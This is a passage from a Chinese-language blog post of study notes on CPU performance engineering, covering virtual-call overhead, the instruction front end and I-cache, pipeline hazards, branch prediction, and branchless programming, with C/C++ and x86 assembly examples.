<p>为了保证每个类的虚拟方法调用都能有统一的结构，编译器会使得所有继承自相同基类（比如 <code>Animal</code>）的类具有相同的虚拟方法表结构。具体来说，编译器会将所有虚拟方法的实现调整为相同长度，并可能会在返回指令后插入一些填充指令，确保每个方法的大小一致。</p>
<p>每个类的实例都会包含一个指向其虚拟方法表的指针。通过这个指针，动态分发的调用可以在运行时找到正确的函数。</p>
<p><strong>虚拟方法调用的性能开销</strong></p>
<p>动态分发虽然很强大，但也有一些性能开销：</p>
<ol>
<li><strong>额外的时间开销</strong>：调用虚拟方法时，程序需要通过对象的 <code>vptr</code> 查找虚拟方法表，然后从表中找到正确的函数地址，最后跳转到该函数。这个过程增加了额外的时间开销，通常在大约 15 个周期左右（与分支预测失败类似）。</li>
<li><strong>无法内联</strong>：由于虚拟方法调用是在运行时确定的，编译器无法像普通函数那样将其内联，从而失去了内联优化的优势。内联通常可以显著减少函数调用的开销。</li>
<li><strong>类大小增加</strong>：每个有虚拟方法的类通常会增加几个字节的空间来存储指向虚拟方法表的指针。这会导致每个对象的大小增加。</li>
<li><strong>二进制文件增大</strong>：由于虚拟方法表和其他运行时支持的存在，最终生成的二进制文件通常比不使用多态的代码要大。</li>
</ol>
<h4 id="机器代码层"><a href="#机器代码层" class="headerlink" title="机器代码层"></a>机器代码层</h4><p>CPU的流水线设计一般将其分为前端和后端两个不同的层次结构。<strong>前端</strong>负责从内存中获取并解码指令。<strong>后端</strong>负责调度并执行这些指令。在很多情况下，性能瓶颈出现在<strong>执行阶段</strong>的后端。因为CPU通常可以比执行更快地获取和解码指令，所以优化往往集中在提高执行效率，减少流水线空闲和延迟，并提高指令级并行性。然而，在某些情况下，<strong>前端</strong>反而会成为瓶颈。这发生在指令获取和解码的速度跟不上后端处理的速度时。即使后端能够处理更多的指令，如果前端没有提供足够的指令，后端就会空闲等待。这种情况通常是由代码布局或指令组织方式引起的。</p>
<h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><p>在前端中，又分为<strong>取指阶段（Fetch）和解码阶段（Decode）</strong>。</p>
<p>在取指阶段，CPU从主内存中加载固定大小的字节块，这些字节包含了多个指令的二进制编码。这一阶段的目标是将指令从内存取出，准备解码。在x86架构中，这个字节块的大小通常是32字节，但在不同的计算机架构上可能会有所不同。这个块的地址必须是对齐的，也就是说，块的地址必须是其大小的倍数（例如32字节的块地址必须是32的倍数）。CPU通常要求加载的指令块必须按照某种对齐规则存储。对于32字节的块来说，块的起始地址必须是32字节的倍数，否则可能会导致取指过程中的额外延迟。</p>
<p>解码阶段负责将取出的字节块转化为具体的机器指令。CPU会查看这32字节的内容，丢弃当前指令指针之前的部分，然后将剩下的字节切分成指令。机器指令使用可变字节数进行编码。最多可能需要15个字节。一个32字节的块可能解码出多个指令，但解码的数量有一定的机器依赖限制，这个限制被称为<strong>解码宽度</strong>（decode width）。解码宽度决定了每个周期最多能解码多少条指令。以Zen 2 CPU为例，其解码宽度为4，即每个周期最多可以解码4条指令并将它们传递到下一阶段。</p>
<p>这两个阶段通常是流水线化的工作方式，即<strong>前面的阶段不会阻塞后面的阶段</strong>。如果CPU能够预测下一块需要加载的指令地址，那么在当前指令块的解码阶段完成之前，取指阶段就会继续加载下一块指令。这种预取机制帮助提高流水线效率，减少CPU等待的时间。</p>
<h5 id="指令缓存（I-cache）"><a href="#指令缓存（I-cache）" class="headerlink" title="指令缓存（I-cache）"></a>指令缓存（I-cache）</h5><p><strong>缓存目的：</strong></p>
<p>I-cache 的核心目的是减少 CPU 每次从主内存加载指令的时间。因为直接从主内存获取指令的速度通常比从缓存中读取要慢得多，所以通过引入 I-cache，能够显著减少指令访问延迟。</p>
<p><strong>结构：</strong></p>
<p>I-cache 存储的是指令，而不是数据。它通常由多个 <strong>缓存行（cache line）</strong> 组成，每个缓存行包含一定数量的指令。缓存的大小和每个缓存行的大小都由硬件架构设计决定。</p>
<p><strong>访问流程：</strong></p>
<p>当 CPU 需要执行某个指令时，它首先检查 I-cache 中是否已有该指令。如果指令已经被缓存（缓存命中），则直接从 I-cache 中取出执行。如果指令不在缓存中（缓存未命中），CPU 就会从主内存中加载该指令，并将其存入 I-cache 中，以便将来使用。这个过程被称为 <strong>缓存加载</strong>。</p>
<p><strong>缓存一致性：</strong></p>
<p>I-cache 通常是只读的缓存（用于存储指令），不会被 CPU 写操作直接修改。</p>
<p>由于现代处理器有多级缓存（例如 L1、L2、L3 缓存），所以当 I-cache 未命中时，CPU 会逐层向上寻找直到主内存。如果在多级缓存之间找到数据，就会将数据从较高层缓存传递到较低层，直到最终命中的缓存级别。</p>
<p><strong>缓存替换策略：</strong></p>
<p>当 I-cache 中没有足够空间存储新的指令时，CPU 会根据一定的策略替换掉较旧或不常用的指令。常见的替换策略包括：</p>
<ul>
<li><strong>LRU（Least Recently Used）</strong>：替换最久未使用的缓存行。</li>
<li><strong>FIFO（First In First Out）</strong>：按缓存行进入缓存的顺序进行替换。</li>
<li><strong>Random</strong>：随机选择缓存行进行替换。</li>
</ul>
<p><strong>对性能的影响：</strong></p>
<p>I-cache 的大小和访问策略对 CPU 性能有很大影响。缓存命中率越高，处理器的性能越好。处理器中的 <strong>流水线（Pipeline）</strong> 和 <strong>超标量执行</strong> 等技术需要频繁获取指令，因此 I-cache 在高性能处理器中尤其重要。</p>
<p>使用指令缓存后，也会相应影响一些优化策略。</p>
<h5 id="非对称分支"><a href="#非对称分支" class="headerlink" title="非对称分支"></a>非对称分支</h5><p>例如有如下C代码，其形式非常对称：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">        <span class="keyword">return</span> x - y;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> y - x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>但如果我们直接翻译成汇编语言：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">length:</span><br><span class="line">    cmp  edi, esi</span><br><span class="line">    jle  less</span><br><span class="line">    ; x &gt; y</span><br><span class="line">    sub  edi, esi</span><br><span class="line">    mov  eax, edi</span><br><span class="line">done:</span><br><span class="line">    ret</span><br><span class="line">less:</span><br><span class="line">    ; x &lt;= y</span><br><span class="line">    sub  esi, edi</span><br><span class="line">    mov  eax, esi</span><br><span class="line">    jmp  done</span><br></pre></td></tr></table></figure></div>
<p>很明显可以发现，如果<code>x&gt;y</code>，只用5条指令就完成了函数调用；但是如果<code>x&lt;=y</code>，就额外需要经过两次跳转。</p>
<p>其实我们可以假设<code>x&gt;y</code>是不大可能的，然后将如上c代码优化为如下版本：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">        swap(x, y);</span><br><span class="line">    <span class="keyword">return</span> y - x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>其对应汇编如下，显而易见比上述实现方式短了两个指令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">length:</span><br><span class="line">    cmp  edi, esi</span><br><span class="line">    jle  normal     ; if x &lt;= y, no swap is needed, and we can skip the xchg</span><br><span class="line">    xchg edi, esi</span><br><span class="line">normal:</span><br><span class="line">    sub  esi, edi</span><br><span class="line">    mov  eax, esi</span><br><span class="line">    ret</span><br></pre></td></tr></table></figure></div>
<p>但我们还能进一步优化，我们可以直接认为<code>x&gt;y</code>不可能发生，优化为如下汇编实现：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">length:</span><br><span class="line">    cmp  edi, esi</span><br><span class="line">    jg   swap</span><br><span class="line">normal:</span><br><span class="line">    sub  esi, edi</span><br><span class="line">    mov  eax, esi</span><br><span class="line">    ret</span><br><span class="line">swap:</span><br><span class="line">    xchg edi, esi</span><br><span class="line">    jmp normal</span><br></pre></td></tr></table></figure></div>
<p>这种优化看起来没什么改变，实际上通过把swap提取到正常执行逻辑之外，可以减少跳转的次数，从而节省时间。第一种形式每次都会有 <strong>条件跳转</strong>（<code>jle</code>），即使在大部分情况下不需要执行交换。而第二种方式在正常情况下不会执行跳转，从而避免了跳转带来的延迟，提升了性能。</p>
<p>对应实现的C代码如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">length</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y) [[unlikely]]</span><br><span class="line">        swap(x, y);</span><br><span class="line">    <span class="keyword">return</span> y - x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="三、指令级并行性（ILP）"><a href="#三、指令级并行性（ILP）" class="headerlink" title="三、指令级并行性（ILP）"></a>三、指令级并行性（ILP）</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>这里的并行并不是指多核并行，因为多核并行实质上是用多个核心实现<strong>计算资源的整合</strong>和<strong>上限突破</strong>，是用计算资源换取效率。这里我们仅考虑一个核心内部的指令并行。执行一条指令大致需要如下5步操作：</p>
<ul>
<li>取指（IF）</li>
<li>解码（ID）</li>
<li>执行（EX）</li>
<li>存储（MEM）</li>
<li>写回（WB）</li>
</ul>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/image-20250313225642301-1741877811093-3.png"
                      class=""
                >
<h4 id="流水线风险"><a href="#流水线风险" class="headerlink" title="流水线风险"></a>流水线风险</h4><p><strong>三种主要的流水线风险</strong></p>
<ol>
<li><strong>结构风险（Structural Hazards）</strong>：<ul>
<li><strong>定义</strong>：结构风险发生在两个或多个指令需要相同的CPU资源时。例如，多个指令可能需要访问相同的执行单元（如加法器或乘法器）。如果这个执行单元在某一时刻无法同时处理多条指令，就会发生结构性风险。</li>
<li><strong>后果</strong>：为了避免冲突，必须等待执行单元空闲后再执行指令，通常这需要额外的一个时钟周期。</li>
<li><strong>解决方法</strong>：结构风险无法完全避免，它们是性能瓶颈的根源，通常需要通过<strong>硬件设计</strong>上的调整（例如，增加更多的执行单元）来应对。</li>
</ul>
</li>
<li><strong>数据风险（Data Hazards）</strong>：<ul>
<li><strong>定义</strong>：数据风险发生在指令之间存在依赖关系时。例如，某条指令的操作数依赖于前一条指令的计算结果。如果前一条指令还未完成，后续指令就无法执行。</li>
<li><strong>后果</strong>：这种情况下，必须等待前一条指令计算完成，才能获取必要的数据，这会导致流水线停顿。数据风险的大小取决于<strong>关键路径的延迟</strong>，即需要等待的数据多久才能计算出来。</li>
<li><strong>解决方法</strong>：通过<strong>重新组织计算顺序</strong>来缩短关键路径，避免不必要的等待。例如，重新安排指令的顺序，或者利用<strong>数据转发（data forwarding）</strong>技术，将计算结果直接传递给后续指令，避免从寄存器读取的延迟。</li>
</ul>
</li>
<li><strong>控制风险（Control Hazards）</strong>：<ul>
<li><strong>定义</strong>：控制风险发生在CPU无法预测下一条需要执行的指令时，通常发生在<strong>分支指令</strong>（如<code>if</code>语句）之后。CPU必须等待条件判断的结果，才能确定接下来的执行路径。</li>
<li><strong>后果</strong>：如果分支预测失败，CPU通常需要<strong>清空流水线</strong>，丢弃所有已取指的指令，并重新加载正确的指令，这会浪费15-20个时钟周期。</li>
<li><strong>解决方法</strong><ul>
<li><strong>消除分支</strong>：通过<strong>循环展开（loop unrolling）</strong>等技术消除分支，从而避免控制风险。</li>
<li><strong>分支预测</strong>：通过优化分支预测，使得CPU能够有效猜测分支的方向。现代CPU使用<strong>动态分支预测</strong>技术，能够根据历史记录预测分支的走向，从而减少控制风险的影响。</li>
<li><strong>分支预测精度</strong>：通过改进分支预测算法，使得分支预测更准确，减少流水线清空的次数。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="分支预测"><a href="#分支预测" class="headerlink" title="分支预测"></a>分支预测</h4><p>分支预测的核心问题正是 CPU 的<strong>流水线处理方式</strong>导致的。具体来说，现代 CPU 采用<strong>指令流水线</strong>（pipeline）技术，以提高指令执行的并行度和吞吐量。但在遇到<strong>分支指令</strong>时，由于目标地址可能依赖于尚未执行完的计算结果，导致 CPU <strong>无法提前确定下一条应该执行的指令</strong>，进而产生流水线的停顿。那为什么我们要进行分支预测呢？这是因为如果我们使流水线停顿等待分支条件的计算结果，中间的等待的时间就相对浪费了，那么我们如果知道执行的概率分布，就可以挑一个可能更高的分支进行<strong>预执行</strong>，那么等到分支条件的计算结果出来之后，如果我们预测成功，相当于高效利用了计算分支条件的这段时间。</p>
<h5 id="case-study"><a href="#case-study" class="headerlink" title="case study"></a>case study</h5><p>假如有如下c代码，假设a数组中等可能随机分布着0-99的数值：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; <span class="number">50</span>)</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>其在Clang下编译出的结果大致如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    mov  rcx, -4000000</span><br><span class="line">    jmp  body</span><br><span class="line">counter:</span><br><span class="line">    add  rcx, 4</span><br><span class="line">    jz   finished   ; &quot;jump if rcx became zero&quot;</span><br><span class="line">body:</span><br><span class="line">    mov  edx, dword ptr [rcx + a + 4000000]</span><br><span class="line">    cmp  edx, 49</span><br><span class="line">    jg   counter</span><br><span class="line">    add  dword ptr [rsp + 12], edx</span><br><span class="line">    jmp  counter</span><br></pre></td></tr></table></figure></div>
<p>这也是个不对称的分支，如果进入<code>a[i] &lt; 50</code>的这个分支，需要多执行 <code>add  dword ptr [rsp + 12], edx</code> 这样一个指令，大约需要多花费4个时钟周期。由于 <code>a[i]</code> 的值是 <strong>完全随机的</strong>，<code>a[i] &lt; 50</code> 成立的概率大约是 <strong>50%</strong>。<code>volatile</code> 关键字的作用是<strong>防止编译器优化</strong>（比如循环展开、向量化等），确保代码执行顺序与写法一致。</p>
<p>现代 CPU 采用 <strong>流水线（pipeline）技术</strong>，在执行一条指令时，会<strong>提前加载下一条指令</strong>。但如果遇到<strong>不可预测的分支</strong>，就会出现 <strong>分支预测失败（Branch Misprediction）</strong>，导致 CPU <strong>清空流水线</strong>，重新加载正确的指令。</p>
<p>在 <strong>AMD Zen 2</strong> 上：</p>
<ul>
<li>CPU 的流水线大约有 <strong>19 个阶段</strong>，如果分支预测失败，就需要 <strong>19 个周期</strong> 来填充流水线。</li>
<li>每次循环：<ol>
<li><strong>读取数组值（memory load）+ 比较（compare）</strong>：大约需要 5 个周期。</li>
<li><strong>加法操作（如果满足条件）</strong>：大约需要 4 个周期。</li>
<li><strong>50% 预测失败的情况下，每 2 次循环需要清空流水线一次（19 个周期）</strong>。</li>
</ol>
</li>
</ul>
<p>那么，每两个元素的平均执行时间是：</p>
<script type="math/tex; mode=display">
(4 + 5 + 19) / 2 = 14 \text{ cycles per element}</script><p>这与实验测得的 <strong>14 个周期/循环</strong> 完全一致，说明 <strong>分支预测失败</strong> 是主要的性能瓶颈。如果我们改变分支的比较条件为小于P，则能得到图表如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/probabilities.svg"
                      class=""
                >
<p>最大值在50处，这比较直观，因为50%概率相当于完全随机选取一个分支进行预取执行，很容易分支预测失败并丢弃整个流水线重新加载。最小值在P=0处，此时相当于每次必不进入分支，那每次基本就只用检查一下条件是否满足。而有一个极小值在85-90%左右，这是因为进入分支会多执行加法操作，会多花约4 个周期。超过了这个转折点，多执行的加法操作代价就超过了10%概率丢弃流水线的代价了。</p>
<h5 id="模式识别"><a href="#模式识别" class="headerlink" title="模式识别"></a>模式识别</h5><p>前面我们讨论了 <strong>分支预测失败（Branch Misprediction）</strong> 对性能的影响。在 <code>P=50%</code>（也就是 <code>a[i]</code> 以 50% 的概率小于 50）的情况下，由于数据是随机分布的，CPU 无法准确预测 <code>if (a[i] &lt; 50)</code> 语句的走向，因此 <strong>每次预测失败都会导致流水线清空</strong>，最终导致 <strong>14 cycles/element</strong> 的低效执行。</p>
<p><strong>1. 排序优化</strong></p>
<p>我们可以在计算前 <strong>先对数组进行排序</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    a[i] = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">std::<span class="built_in">sort</span>(a, a + N);</span><br></pre></td></tr></table></figure></div>
<p>这样，数组 <code>a</code> 变成了一个 <strong>递增序列</strong>：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">0, 1, 2, ..., 49, 50, ..., 99</span>]</span><br></pre></td></tr></table></figure></div>
<p>这意味着：</p>
<ul>
<li><strong>前半部分</strong> (<code>a[i] &lt; 50</code>) <strong>连续执行 “yes” 分支</strong>。</li>
<li><strong>后半部分</strong> (<code>a[i] &gt;= 50</code>) <strong>连续执行 “no” 分支</strong>。</li>
</ul>
<p>这时，<strong>CPU 的分支预测器可以轻松适应这个模式</strong>：</p>
<ul>
<li><strong>在前 50% 的数据里，分支总是跳转到 <code>s += a[i]</code> 语句</strong>。</li>
<li><strong>在后 50% 的数据里，分支总是不进入加法逻辑</strong>。</li>
</ul>
<p>因为 CPU 的 <strong>动态分支预测器（Dynamic Branch Predictor）</strong> 能检测到<strong>“连续命中”模式</strong>，所以流水线 <strong>几乎不会被清空</strong>，这样<strong>每个元素的计算只需要 4 cycles，而不是 14 cycles</strong>。</p>
<p><strong>2. 预测器如何学习更复杂的模式？</strong></p>
<p>现代 CPU 的分支预测器远比 <strong>“历史统计”</strong> 更先进。它们不仅会<strong>记录某个分支的过去走向</strong>，还会<strong>识别更复杂的执行模式</strong>。</p>
<p><strong>实验 1：减少 <code>N</code> 的大小</strong> 如果我们把数组大小 <code>N</code> <strong>减少到 1000</strong>，但<strong>不排序</strong>：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; i++)</span><br><span class="line">    a[i] = <span class="built_in">rand</span>() % <span class="number">100</span>;</span><br></pre></td></tr></table></figure></div>
<p>此时，CPU <strong>可以完全记住所有 1000 个数据点的分支模式</strong>：</p>
<ul>
<li>因为 <strong>分支预测器的历史表（BTB, Branch Target Buffer）能够存储足够多的历史信息</strong>，它可以记住 <strong>每个 <code>a[i] &lt; 50</code> 的位置</strong>，从而 <strong>100% 预测成功</strong>。</li>
<li>这样，CPU <strong>根本不会犯错</strong>，分支预测 <strong>几乎完美</strong>，导致 <strong>执行时间降到 4 cycles/element 以下</strong>！</li>
</ul>
<h5 id="分支提示"><a href="#分支提示" class="headerlink" title="分支提示"></a>分支提示</h5><p>如果我们<strong>事先知道某个分支更可能被执行</strong>，可以 <strong>显式地告诉编译器</strong>，让它优化指令布局，使 CPU 处理分支更快。</p>
<p>C++20 引入了 <code>[[likely]]</code> 关键字，可以用于指示某个分支<strong>更有可能被执行</strong>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; P) [[likely]]  <span class="comment">// 提示这个分支更可能执行</span></span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>当 <code>P=75</code> 时：</p>
<ul>
<li><strong>使用 <code>[[likely]]</code></strong>：执行速度 <strong>≈ 7.3 cycles/element</strong></li>
<li><strong>不使用 <code>[[likely]]</code></strong>：执行速度 <strong>≈ 8.3 cycles/element</strong></li>
</ul>
<p><strong>提升了约 1 cycle 的效率</strong>。</p>
<p><code>[[likely]]</code> 并不会直接影响 CPU 的分支预测器，而是改变了汇编代码的布局，使 CPU 前端（Front-End）更容易处理常见分支。也就是使<strong>更可能执行的分支紧跟主代码路径</strong>（减少 <code>jmp</code> 跳转的开销）。</p>
<p>在 C++20 之前，也可以使用 <code>__builtin_expect</code>（GCC &amp; Clang 支持）：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LIKELY(x) __builtin_expect(!!(x), 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNLIKELY(x) __builtin_expect(!!(x), 0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (LIKELY(a[i] &lt; P))</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<h4 id="少分支编程"><a href="#少分支编程" class="headerlink" title="少分支编程"></a>少分支编程</h4><p>既然进行分支预测可能会导致整个流水线清空重载，那么我们很容易想尝试能不能不用或少用分支实现同样的功能。</p>
<p>比如还是上述例子：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    a[i] = rand() % <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> s;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    <span class="keyword">if</span> (a[i] &lt; <span class="number">50</span>)</span><br><span class="line">        s += a[i];</span><br></pre></td></tr></table></figure></div>
<p>可以用如下方法进行优化，去除掉if语句。<br><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">    s += (a[i] &lt; <span class="number">50</span>) * a[i];</span><br></pre></td></tr></table></figure></div></p>
<p>汇编中没有布尔类型，也没有直接建立正负值到0，1的映射。但是我们可以通过位操作技巧来实现这个功能，也就是右移位31位（因为int类型占32位）。这样由于负数的补码表示中最高位为1，所以可以用来建立一个正负值到0，1的映射。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">; x = a[i]</span><br><span class="line">mov  ebx, eax   ; t = x</span><br><span class="line">sub  ebx, 50    ; t -= 50</span><br><span class="line">sar  ebx, 31    ; t &gt;&gt;= 31</span><br><span class="line">imul  eax, ebx   ; x *= t</span><br><span class="line">add dword ptr [rsp + 12], eax	; s+=x</span><br></pre></td></tr></table></figure></div>
<p>由于imul需要花费3个cycle，于是有种花费2个cycle实现的方式：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov  ebx, eax   ; t = x</span><br><span class="line">sub  ebx, 50    ; t -= 50</span><br><span class="line">sar  ebx, 31    ; t &gt;&gt;= 31</span><br><span class="line">; imul  eax, ebx ; x *= t</span><br><span class="line">sub  ebx, 1     ; t -= 1 (causing underflow if t = 0)</span><br><span class="line">and  eax, ebx   ; x &amp;= t</span><br><span class="line">add dword ptr [rsp + 12], eax	; s+=x</span><br></pre></td></tr></table></figure></div>
<p>但上述两种优化方式没有考虑下溢出的情况，也就是<script type="math/tex">[−2^{31},−2^{31}+49]</script> 这个范围内的值减50后会溢出，从而导致进入错误的分支。</p>
<p>所以现代 CPU 提供了一种<strong>条件移动（Conditional Move, <code>cmov</code>）</strong>指令，能<strong>避免乘法和位运算</strong>，提高效率：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     ebx, 0      ; cmov 不能直接使用立即数，所以先设定 ebx=0</span><br><span class="line">cmp     eax, 50</span><br><span class="line">cmovge  eax, ebx    ; 若 eax &gt;= 50，则 eax = ebx (0)</span><br></pre></td></tr></table></figure></div>
<p>这相当于：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">s += (a[i] &lt; <span class="number">50</span> ? a[i] : <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>
<p>最终编译器优化的汇编代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, -4000000</span><br><span class="line">loop:</span><br><span class="line">    mov     esi, dword ptr [rdx + a + 4000000]  ; 读取 a[i]</span><br><span class="line">    cmp     esi, 50</span><br><span class="line">    cmovge  esi, eax                            ; esi = (esi &gt;= 50 ? 0 : esi)</span><br><span class="line">    add     dword ptr [rsp + 12], esi           ; s += esi</span><br><span class="line">    add     rdx, 4</span><br><span class="line">    jnz     loop                                ; 继续循环</span><br></pre></td></tr></table></figure></div>
<h4 id="决定何时用分支"><a href="#决定何时用分支" class="headerlink" title="决定何时用分支"></a>决定何时用分支</h4><p>由于cmov的方式实际上还是会让流水线产生暂停，这里我们可以对比一下两种不同方式在不同P值情况下的效率。可以看出当有75%把握确定选取某个分支时，分支预测的效率实际是会优于无分支方式的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/13/Algorithmica-HPC%E7%A0%94%E8%AF%BB%E8%AE%B0%E5%BD%951/branchy-vs-branchless.svg"
                      class=""
                >
<h4 id="应用示例"><a href="#应用示例" class="headerlink" title="应用示例"></a>应用示例</h4><h5 id="字符串处理"><a href="#字符串处理" class="headerlink" title="字符串处理"></a><strong>字符串处理</strong></h5><p>在简化的情况下，<code>std::string</code> 实际上是由指向一个以 null 结尾的字符数组（也就是 C 字符串）的指针，以及一个存储字符串大小的整数组成的。一个常见的字符串值是空字符串，它的默认值也是空字符串。</p>
<p>处理空字符串的传统方式是，将字符串的指针赋为 <code>nullptr</code>，并将字符串大小赋为 0。在处理字符串时，我们需要检查指针是否为空或者大小是否为零。这样就会引入一个分支（<code>if</code> 检查），这种分支会带来性能开销（尤其是在大多数字符串为空或非空的情况下）。</p>
<p>为了去除这个分支，我们可以为空字符串分配一个“零 C 字符串”，即分配一个包含零字节的内存，并将所有空字符串都指向这个零字节。这样，所有处理空字符串的操作都将读取这个无用的零字节，虽然这会增加一些操作，但仍然比一个分支预测错误的开销要小得多。</p>
<h5 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a><strong>二分查找</strong></h5><p>标准的二分查找可以通过消除分支来实现，在处理小数组（适合缓存时）时，比使用分支的 <code>std::lower_bound</code> 快大约 4 倍。</p>
<p>以下是一个消除分支的二分查找实现：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">lower_bound</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> *base = t, len = n;</span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> half = len / <span class="number">2</span>;</span><br><span class="line">        base += (base[half - <span class="number">1</span>] &lt; x) * half;  <span class="comment">// 会被替换成 &quot;cmov&quot;</span></span><br><span class="line">        len -= half;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> *base;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个实现的复杂度略高，但它的一个缺点是它可能会进行更多的比较（比标准二分查找需要更多的比较），并且无法像传统二分查找那样进行未来内存读取的预测（这通常作为预取操作，因此在处理非常大的数组时会有所损失）。</p>
<p>总结来说，数据结构通过隐式或显式地填充数据，消除分支，使得其操作需要固定次数的迭代。更多复杂的示例可以参考相关资料。</p>
<h5 id="数据并行编程"><a href="#数据并行编程" class="headerlink" title="数据并行编程"></a><strong>数据并行编程</strong></h5><p>在 SIMD（单指令多数据）应用中，分支消除非常重要，因为 SIMD 本身不支持分支操作。</p>
<p>在我们之前的数组求和例子中，去除累加器的 <code>volatile</code> 类型修饰符后，编译器能够对循环进行向量化优化：</p>
